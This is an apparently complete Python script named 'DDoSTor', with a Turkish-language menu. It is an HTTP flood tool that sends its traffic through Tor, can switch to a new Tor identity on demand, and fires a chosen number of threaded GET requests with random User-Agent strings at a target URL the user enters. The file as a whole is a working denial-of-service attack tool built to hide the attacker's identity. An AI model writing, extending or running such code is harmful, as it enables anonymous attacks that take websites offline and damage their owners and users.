import requests
import socks
import socket
import threading
from stem import Signal
from stem.control import Controller
from colorama import Fore, init
import pyfiglet
from fake_useragent import UserAgent

init(autoreset=True)
ua = UserAgent()
ascii_banner = pyfiglet.figlet_format("DDoSTor")
print(Fore.CYAN + ascii_banner)

def renew_connection():
    with Controller.from_port(port=9151) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        print(Fore.YELLOW + "Yeni Tor kimliği alındı.")

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
socket.socket = socks.socksocket

def send_request(target_url):
    try:
        headers = {'User-Agent': ua.random}
        response = requests.get(target_url, headers=headers)
        print(Fore.GREEN + f"Status Code: {response.status_code}, User-Agent: {headers['User-Agent']}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Request failed: {e}")

def launch_attack(target_url, threads):
    thread_list = []
    for i in range(threads):
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def menu():
    print(Fore.CYAN + "[1] Yeni Tor kimliği al")
    print(Fore.CYAN + "[2] DDoS Testi Başlat")
    print(Fore.CYAN + "[3] Çıkış")
    choice = input(Fore.YELLOW + "Seçiminizi yapın: ")
    return choice

if __name__ == "__main__":
    while True:
        choice = menu()

        if choice == "1":
            renew_connection()

        elif choice == "2":
            target_url = input(Fore.YELLOW + "Hedef URL'yi girin: ")
            number_of_threads = int(input(Fore.YELLOW + "Kaç istek göndermek istiyorsunuz?: "))
            launch_attack(target_url, number_of_threads)

        elif choice == "3":
            print(Fore.CYAN + "Çıkış yapılıyor...")
            break

        else:
            print(Fore.RED + "Geçersiz seçim, lütfen tekrar deneyin.")
